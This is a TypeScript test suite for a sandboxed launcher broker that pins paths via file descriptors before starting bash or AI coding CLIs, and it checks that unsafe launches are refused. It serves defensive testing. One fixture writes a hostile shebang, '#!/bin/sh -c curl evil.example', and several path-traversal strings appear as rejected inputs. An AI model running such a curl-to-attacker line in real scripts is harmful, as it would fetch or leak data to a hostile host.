import { describe, expect, it } from 'vitest';

import {
  BROKER_RUNTIME_POLICY,
  BROKER_SYSTEMD_POLICY,
  FdPinnedPathError,
  LINUX_CHILD_ENV_KEYS,
  type PinnedIdentity,
  type PinningFileSystem,
  buildBrokerLaunch,
  enumerateBrokerLaunchers,
  launcherExecutable,
  pinBrokerLaunch,
  pinnableLauncher,
  resolveLinuxRoot,
  validateRelativeCwd,
} from './fdPinnedPaths.ts';

/** Linux O_PATH: the flag the walk retries a symlink component with. */
const O_PATH = 0x20_0000;

describe('fdPinnedPaths', () => {
  it('pins the two exact roots and the runtime-state policy', () => {
    expect(resolveLinuxRoot('repo')).toBe('/var/lib/kb/ops');
    expect(resolveLinuxRoot('worktrees')).toBe('/var/lib/kb-shell/worktrees');
    expect(BROKER_RUNTIME_POLICY).toEqual({
      runtimeDirectory: '/run/kb-shell',
      runtimeDirectoryMode: 0o750,
      statePath: '/run/kb-shell/state.json',
      stateOwner: 'kb-shell:kb-shell',
      stateMode: 0o600,
      inaccessiblePaths: ['/var/lib/kb/state', '/opt/kb-releases', '/var/lib/kb-activation'],
    });
    // The unit's path sandbox has exactly one copy, and it is the systemd literal.
    expect(BROKER_RUNTIME_POLICY.runtimeDirectoryMode)
      .toBe(Number.parseInt(BROKER_SYSTEMD_POLICY.socket.RuntimeDirectoryMode, 8));
    expect(Object.keys(BROKER_RUNTIME_POLICY)).not.toContain('readWritePaths');
    expect(Object.keys(BROKER_RUNTIME_POLICY)).not.toContain('readOnlyPaths');
    expect(BROKER_SYSTEMD_POLICY.service.ReadWritePaths.split(' '))
      .toContain('/var/lib/kb-shell/worktrees');
  });

  it('rejects traversal, absolute paths, denied roots, controls, and unsafe path segments', () => {
    expect(validateRelativeCwd('safe/nested')).toBe('safe/nested');
    for (const value of ['../state', '/root', 'C:\\Windows', '\\\\host\\share', 'a//b', 'a/./b',
      'a/../b', 'a/CON', 'a/trailing.', 'a/trailing ', 'a\u0000b', '\u202e']) {
      expect(() => validateRelativeCwd(value)).toThrow(FdPinnedPathError);
    }
  });

  it('owns the closed recipe-to-argv table and minimal child environment', () => {
    const claude = buildBrokerLaunch({
      launcher: 'claude', mode: 'headless-json', model: 'claude-sonnet-4-5',
      toolPolicyId: 'standard', sandbox: 'claude-policy', resumeRef: 'resume-1',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    expect(claude.executable).toBe('/var/lib/kb-shell/home/.local/bin/claude');
    expect(claude.args).toEqual([
      '-p', '--output-format', 'stream-json', '--input-format', 'stream-json', '--verbose',
      '--model', 'claude-sonnet-4-5', '--resume', 'resume-1', '--allowedTools',
      'Read,Write,Edit,Bash', '--permission-mode', 'acceptEdits',
    ]);

    const codex = buildBrokerLaunch({
      launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6',
      toolPolicyId: 'standard', sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 100, rows: 30 });
    expect(codex.args).toEqual([
      'exec', '-', '--json', '--model', 'gpt-5.6', '-s', 'workspace-write',
      '-c', 'approval_policy=never', '-c', 'forced_login_method="chatgpt"',
      '-c', 'mcp_servers={}', '-c', 'sandbox_workspace_write.network_access=false',
      '-c', 'web_search="disabled"', '--cd', '/var/lib/kb-shell/worktrees/run-1',
    ]);
    expect(Object.keys(codex.env).sort()).toEqual([...LINUX_CHILD_ENV_KEYS].sort());
    expect(codex.env).not.toHaveProperty('TOKEN');
    expect(() => buildBrokerLaunch({
      launcher: 'codex', mode: 'headless-json', model: 'gpt-5.6-evil',
      toolPolicyId: 'standard', sandbox: 'codex-workspace-write',
    }, 'worktrees', 'run-1', { cols: 80, rows: 24 })).toThrow('approved model');
  });

  it('opens every component relative to pinned dirfds, accepts 02770 worktrees, and launches only proc fds', async () => {
    const opened: string[] = [];
    const identities = new Map<number, PinnedIdentity>();
    let nextFd = 10;
    const fakeFs = {
      open(path: string, _flags: number): number {
        opened.push(path);
        const fd = nextFd++;
        const leaf = path.split('/').at(-1);
        const worktree = leaf === 'worktrees';
        const run = leaf === 'run-1';
        const file = leaf === 'bash';
        identities.set(fd, { dev: 1n, ino: BigInt(fd), uid: worktree ? 1001 : run ? 1000 : 0,
          gid: worktree || run ? 1000 : 0, mode: file ? 0o100755 : worktree || run ? 0o042770 : 0o040755,
          kind: file ? 'file' : 'directory' });
        return fd;
      },
      identity(fd: number) { return identities.get(fd)!; },
      identityAt(_path: string, expected: PinnedIdentity) { return expected; },
      readlink() { throw new Error('not a symlink'); },
      read() { return Buffer.from([0x7f, 0x45, 0x4c, 0x46]); },
      close() {},
    };
    const pinned = await pinBrokerLaunch(buildBrokerLaunch({ launcher: 'shell', mode: 'interactive', model: null,
      toolPolicyId: 'shell-default', sandbox: 'interactive' }, 'worktrees', 'run-1', { cols: 80, rows: 24 }),
    { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 }, fakeFs);
    expect(opened[0]).toBe('/');
    expect(opened.slice(1).every((value) => value === '/' || value.startsWith('/proc/self/fd/'))).toBe(true);
    expect(pinned.launch.executable).toMatch(/^\/proc\/self\/fd\/\d+$/);
    expect(pinned.launch.cwd).toMatch(/^\/proc\/self\/fd\/\d+$/);
    await pinned.close();
  });

  it('follows a policy-valid symlink but refuses one swapped between the O_PATH pin and its use', async () => {
    const readlinks: string[] = [];
    const symlinkRechecks: string[] = [];
    // `run-1` is a symlink: O_NOFOLLOW|O_DIRECTORY fails with ELOOP, and only the O_PATH retry
    // succeeds — returning a symlink fd whose identity the walk must verify before it is used.
    const makeFake = (swap: 'symlink-swapped' | 'symlink-valid' | 'ancestor') => {
      let nextFd = 20;
      const identities = new Map<number, PinnedIdentity>();
      return {
        open(path: string, flags: number): number {
          const symlinkComponent = swap !== 'ancestor' && path.endsWith('/run-1');
          if (symlinkComponent && (flags & O_PATH) === 0) {
            throw Object.assign(new Error('symlink'), { code: 'ELOOP' });
          }
          const fd = nextFd++;
          const file = path.endsWith('/bash');
          const worktree = path.endsWith('/worktrees');
          const directory = path.endsWith('/run-1') || path.endsWith('/target');
          identities.set(fd, symlinkComponent
            // the pinned O_PATH fd: a symlink owned by kb-shell inside the 02770 worktree root
            ? { dev: 1n, ino: BigInt(fd), uid: 1000, gid: 1000, mode: 0o120777, kind: 'other' }
            : { dev: 1n, ino: BigInt(fd), uid: worktree ? 1001 : directory ? 1000 : 0,
              gid: worktree || directory ? 1000 : 0,
              mode: file ? 0o100755 : worktree || directory ? 0o042770 : 0o040755,
              kind: file ? 'file' : 'directory' });
          return fd;
        },
        identity(fd: number) { return identities.get(fd)!; },
        identityAt(path: string, expected: PinnedIdentity) {
          if (path.endsWith('/run-1')) symlinkRechecks.push(path);
          // the parent-anchored lstat of the symlink resolves to a different inode: a real swap
          if (swap === 'symlink-swapped' && path.endsWith('/run-1')) return { ...expected, ino: expected.ino + 1n };
          return swap === 'ancestor' && path === '/var/lib' ? { ...expected, ino: expected.ino + 1n } : expected;
        },
        readlink(path: string) {
          readlinks.push(path);
          if (!path.endsWith('/run-1')) throw new Error('not a symlink');
          return '/var/lib/kb-shell/worktrees/target';
        },
        read() { return Buffer.from([0x7f, 0x45, 0x4c, 0x46]); }, close() {},
      };
    };
    const launch = buildBrokerLaunch({ launcher: 'shell', mode: 'interactive', model: null,
      toolPolicyId: 'shell-default', sandbox: 'interactive' }, 'worktrees', 'run-1', { cols: 80, rows: 24 });
    const ids = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };

    await expect(pinBrokerLaunch(launch, ids, makeFake('symlink-swapped')))
      .rejects.toThrow('pinned symlink identity changed');
    await expect(pinBrokerLaunch(launch, ids, makeFake('ancestor')))
      .rejects.toThrow('pinned ancestor identity changed');

    const pinned = await pinBrokerLaunch(launch, ids, makeFake('symlink-valid'));
    expect(pinned.launch.cwd).toMatch(/^\/proc\/self\/fd\/\d+$/);
    // the link contents and its identity recheck both go through the pinned parent dirfd,
    // never through the full pathname the walk started from
    expect(readlinks.every((value) => value.startsWith('/proc/self/fd/'))).toBe(true);
    expect(symlinkRechecks.length).toBeGreaterThan(0);
    expect(symlinkRechecks.every((value) => value.startsWith('/proc/self/fd/'))).toBe(true);
    await pinned.close();
  });
});

/**
 * A VM filesystem, described as the nodes the pin walk will actually open. Each fixture states the
 * machine it describes and nothing more: no path is special-cased, so a launcher appears in an
 * enumeration exactly when the same walk that runs at launch would accept it.
 */
type FakeNode = { kind: 'file' | 'directory'; uid: number; gid: number; mode: number; content?: string };
const PIN_IDENTITIES = { rootUid: 0, shellUid: 1000, shellGid: 1000, dashboardUid: 1001, dashboardGid: 1001 };

/** The provisioned VM: both CLIs installed under the 0700 kb-shell home, bash where bash lives. */
function vmTree(): Record<string, FakeNode> {
  const rootDir = (mode = 0o755): FakeNode => ({ kind: 'directory', uid: 0, gid: 0, mode });
  const homeDir = (mode: number): FakeNode => ({ kind: 'directory', uid: 1000, gid: 1000, mode });
  const cli = (content: string): FakeNode => ({ kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content });
  return {
    '/': rootDir(),
    '/bin': rootDir(),
    '/bin/bash': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
    '/usr': rootDir(),
    '/usr/bin': rootDir(),
    '/usr/bin/node': { kind: 'file', uid: 0, gid: 0, mode: 0o755, content: 'ELF' },
    '/var': rootDir(),
    '/var/lib': rootDir(),
    '/var/lib/kb-shell': { kind: 'directory', uid: 0, gid: 1000, mode: 0o750 },
    '/var/lib/kb-shell/home': homeDir(0o700),
    '/var/lib/kb-shell/home/.local': homeDir(0o750),
    '/var/lib/kb-shell/home/.local/bin': homeDir(0o750),
    // The real shape: npm-installed CLIs are node scripts, so enumeration must clear the shebang
    // allowlist and pin the interpreter too, exactly as launch does.
    '/var/lib/kb-shell/home/.local/bin/claude': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
    '/var/lib/kb-shell/home/.local/bin/codex': cli('#!/usr/bin/env node\nrequire("./cli.js");\n'),
  };
}

function pinningFsOver(tree: Record<string, FakeNode>): PinningFileSystem {
  let nextFd = 10;
  let nextIno = 1n;
  const openPaths = new Map<number, string>();
  const inodes = new Map<string, bigint>();
  const identityOf = (absolute: string): PinnedIdentity => {
    const node = tree[absolute];
    if (node === undefined) throw Object.assign(new Error('no such file'), { code: 'ENOENT' });
    if (!inodes.has(absolute)) inodes.set(absolute, nextIno++);
    return { dev: 1n, ino: inodes.get(absolute)!, uid: node.uid, gid: node.gid,
      mode: (node.kind === 'directory' ? 0o040000 : 0o100000) | node.mode, kind: node.kind };
  };
  // The walk addresses every component through its pinned parent dirfd; resolve that back to the
  // absolute path the fixture is written in, so the fixture never has to know about fd numbers.
  const absoluteOf = (target: string): string => {
    const viaFd = /^\/proc\/self\/fd\/(\d+)\/(.+)$/.exec(target);
    if (viaFd === null) return target;
    const parent = openPaths.get(Number(viaFd[1]));
    if (parent === undefined) throw new Error('walk used an unpinned descriptor');
    return parent === '/' ? `/${viaFd[2]!}` : `${parent}/${viaFd[2]!}`;
  };
  return {
    open(target: string): number {
      const absolute = absoluteOf(target);
      identityOf(absolute);
      const fd = nextFd++;
      openPaths.set(fd, absolute);
      return fd;
    },
    identity: (fd: number) => identityOf(openPaths.get(fd)!),
    identityAt: (target: string) => identityOf(absoluteOf(target)),
    readlink() { throw new Error('not a symlink'); },
    read: (fd: number) => Buffer.from(tree[openPaths.get(fd)!]?.content ?? '', 'utf8'),
    close: (fd: number) => { openPaths.delete(fd); },
  };
}

describe('enumerateBrokerLaunchers', () => {
  it('names the launchers a provisioned VM can actually pin, resolving paths from the launch table', async () => {
    expect(launcherExecutable('shell')).toBe('/bin/bash');
    expect(launcherExecutable('claude')).toBe('/var/lib/kb-shell/home/.local/bin/claude');
    expect(launcherExecutable('codex')).toBe('/var/lib/kb-shell/home/.local/bin/codex');
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(vmTree())))
      .toEqual(['shell', 'claude', 'codex']);
  });

  it('answers shell-only and one-CLI machines honestly instead of the full set', async () => {
    const shellOnly = vmTree();
    delete shellOnly['/var/lib/kb-shell/home/.local/bin/claude'];
    delete shellOnly['/var/lib/kb-shell/home/.local/bin/codex'];
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(shellOnly))).toEqual(['shell']);

    const claudeOnly = vmTree();
    delete claudeOnly['/var/lib/kb-shell/home/.local/bin/codex'];
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(claudeOnly)))
      .toEqual(['shell', 'claude']);
  });

  it('drops a launcher the pin validator refuses, even though the file is right there', async () => {
    // 0755 inside the 0700 provider home: the pin's ownership/mode matrix refuses it. The binary
    // EXISTS; the honest answer is still that it cannot be launched.
    const worldReadable = vmTree();
    worldReadable['/var/lib/kb-shell/home/.local/bin/codex'] = {
      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: '#!/usr/bin/env node\n',
    };
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(worldReadable)))
      .toEqual(['shell', 'claude']);
    expect(await pinnableLauncher('codex', PIN_IDENTITIES, pinningFsOver(worldReadable))).toBe(false);

    // Same rule for the shebang allowlist: an interpreter line that is not an approved absolute
    // /bin or /usr/bin name drops the launcher rather than being executed to find out.
    const badInterpreter = vmTree();
    badInterpreter['/var/lib/kb-shell/home/.local/bin/claude'] = {
      kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: '#!/bin/sh -c curl evil.example\n',
    };
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(badInterpreter)))
      .toEqual(['shell', 'codex']);
  });

  it('reports NOTHING when the enumeration itself throws — never a launcher, never a partial guess', async () => {
    const onFire = (): never => { throw new Error('the filesystem is on fire'); };
    const exploding: PinningFileSystem = {
      open: onFire, identity: onFire, identityAt: onFire,
      readlink: onFire, read: onFire, close: onFire,
    };
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, exploding)).toEqual([]);
    for (const launcher of ['shell', 'claude', 'codex'] as const) {
      expect(await pinnableLauncher(launcher, PIN_IDENTITIES, exploding), launcher).toBe(false);
    }

    // A single launcher whose walk explodes takes only itself out of the set.
    const healthy = pinningFsOver(vmTree());
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, {
      ...healthy,
      open: (target: string, flags: number) => {
        if (target.endsWith('/codex')) throw new Error('EIO');
        return healthy.open(target, flags);
      },
    })).toEqual(['shell', 'claude']);
  });
});
